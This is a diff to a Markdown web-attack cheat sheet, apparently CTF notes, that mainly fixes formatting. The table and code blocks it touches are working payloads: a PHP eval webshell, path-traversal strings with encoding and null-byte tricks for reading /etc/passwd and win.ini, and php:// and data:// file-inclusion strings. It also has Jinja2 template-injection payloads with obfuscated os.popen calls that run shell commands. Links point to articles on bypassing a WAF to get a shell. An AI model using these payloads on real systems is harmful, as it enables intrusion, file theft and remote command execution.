@@ -14,16 +14,16 @@
 [实战绕过某 WAF+拿 shell 组合拳](https://mp.weixin.qq.com/s/Q57dOjq279kqOFtSA1mV8Q)
 [webshell 检测算法实践](https://mp.weixin.qq.com/s/M4umpduFCI50zOO-5080cw)
 
-| bypass        | payload                                                |     |
-| ------------- | ------------------------------------------------------ | --- |
-| <?            | `<script language="php">@eval($\_POST['1']);</script>` |     |
-| %2F 代替/     | ?filename=..%2F..%2F..%2F..%2Fetc%2Fpasswd             |     |
-| 二次编码(%25) | ?filename=..%252F..%252F..%252F..%252Fetc%2Fpasswd     |
-| 加入+         | ?filename=.+./.+./bin/redacted.dll                     |
-| %00           | ?filename=.%00./file.php <br>/etc/passwd%00.jpg        |
-| \             | ?filename=..%5c..%5c/windows/win.ini                   |
-| is_numeric    | is_numeric ('0xFFFF') 16 进制绕过                      |
-| 反码绕        | urlencode(~'system');                                  |
+| bypass        | payload                                               |     |
+| ------------- | ----------------------------------------------------- | --- |
+| <?            | `<script language="php">@eval($_POST['1']);</script>` |     |
+| %2F 代替/     | ?filename=..%2F..%2F..%2F..%2Fetc%2Fpasswd            |     |
+| 二次编码(%25) | ?filename=..%252F..%252F..%252F..%252Fetc%2Fpasswd    |
+| 加入+         | ?filename=.+./.+./bin/redacted.dll                    |
+| %00           | ?filename=.%00./file.php <br>/etc/passwd%00.jpg       |
+| \             | ?filename=..%5c..%5c/windows/win.ini                  |
+| is_numeric    | is_numeric ('0xFFFF') 16 进制绕过                     |
+| 反码绕        | urlencode(~'system');                                 |
 
 ## bypass functions
 
@@ -37,11 +37,12 @@
 
 `?text=data://test/plain,welcome to the zjctf&file=php://filter/resource=useless.php`
 `?text=data://test/plain,I have a dream&file=php://filter/resource=next.php`
+
 # Web - Python bypass
 
 ```py
-{{ config.__class__.__init__.__globals__['\x6f\x73'].__getattribute__('\x70\x6f\x70\x65\x6e')('ls /').read() }} 
-{{ config.__class__.__init__.__globals__['\x6f\x73'].__getattribute__('\x70\x6f\x70\x65\x6e')('cat /this_is_the_fla""g.txt').read() }} 
+{{ config.__class__.__init__.__globals__['\x6f\x73'].__getattribute__('\x70\x6f\x70\x65\x6e')('ls /').read() }}
+{{ config.__class__.__init__.__globals__['\x6f\x73'].__getattribute__('\x70\x6f\x70\x65\x6e')('cat /this_is_the_fla""g.txt').read() }}
 ```
 
 # Cmd bypass
